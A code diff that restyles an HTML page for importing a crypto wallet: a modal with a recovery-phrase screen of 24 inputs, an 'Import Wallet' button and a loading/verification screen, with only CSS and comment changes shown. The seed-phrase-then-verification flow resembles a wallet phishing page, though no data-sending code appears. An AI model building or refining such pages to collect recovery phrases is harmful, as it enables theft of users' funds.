@@ -13,7 +13,7 @@
         }
 
         body {
-            background-color: #e5e4ef;
+            background-color: #f3eef9; /* Really light purple page background */
             color: #fff;
             height: 100vh;
             display: flex;
@@ -73,10 +73,10 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 460px;
+            width: 480px;
             border-radius: 20px;
-            padding: 32px 24px 24px 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+            padding: 28px 24px 24px 24px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -87,7 +87,7 @@
         .dots {
             display: flex;
             gap: 5px;
-            margin-bottom: 20px;
+            margin-bottom: 12px;
         }
 
         .dot {
@@ -105,7 +105,7 @@
         .modal-title {
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 6px;
+            margin-bottom: 4px;
             color: #fff;
             text-align: center;
         }
@@ -113,7 +113,7 @@
         .modal-subtitle {
             font-size: 12px;
             color: #8c8c9e;
-            margin-bottom: 24px;
+            margin-bottom: 14px;
             text-align: center;
             line-height: 1.4;
         }
@@ -128,16 +128,6 @@
             padding: 10px 0;
         }
 
-        .screen-center .modal-title {
-            margin-bottom: 12px;
-        }
-
-        .screen-center .modal-subtitle {
-            margin-bottom: 32px;
-            max-width: 320px;
-        }
-
-        /* Spinner Animation */
         .spinner {
             width: 36px;
             height: 36px;
@@ -157,25 +147,13 @@
             display: none !important;
         }
 
-        /* Inputs Grid */
+        /* Expanded Inputs Container (No Scroll, Fits All 24 Inputs) */
         .inputs-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 6px;
             width: 100%;
-            max-height: 220px;
-            overflow-y: auto;
-            padding-right: 2px;
-            margin-bottom: 14px;
-        }
-
-        .inputs-container::-webkit-scrollbar {
-            width: 3px;
-        }
-
-        .inputs-container::-webkit-scrollbar-thumb {
-            background: #27272a;
-            border-radius: 3px;
+            margin-bottom: 12px;
         }
 
         .input-group {
@@ -184,7 +162,7 @@
             border: 1px solid #232329;
             border-radius: 8px;
             padding: 5px 8px;
-            height: 42px;
+            height: 38px;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -218,19 +196,19 @@
             color: #ef4444;
             font-size: 11px;
             width: 100%;
-            margin-bottom: 14px;
+            margin-bottom: 10px;
             display: none;
             text-align: center;
         }
 
-        /* Switch Phrase Type Toggle with Smooth Fade Animation */
+        /* Toggle Phrase Button: Gray fading into Purple on hover */
         .toggle-phrase {
             color: #8c8c9e;
             background: none;
             border: none;
             font-size: 12px;
             cursor: pointer;
-            margin-bottom: 16px;
+            margin-bottom: 12px;
             font-weight: 500;
             transition: color 0.25s ease;
         }
@@ -286,7 +264,7 @@
                 <button type="button" class="action-btn" id="startBtn">Continue</button>
             </div>
 
-            <!-- Recovery Phrase Input Screen (Initially Hidden) -->
+            <!-- Recovery Phrase Input Screen -->
             <div id="phraseScreen" class="hidden" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                 <div class="dots">
                     <div class="dot active"></div>
@@ -306,7 +284,7 @@
                 <button type="button" class="action-btn" id="importBtn">Import Wallet</button>
             </div>
 
-            <!-- Loading / Verification Screen (Initially Hidden) -->
+            <!-- Loading / Verification Screen -->
             <div class="screen-center hidden" id="loadingScreen">
                 <div class="dots">
                     <div class="dot active"></div>
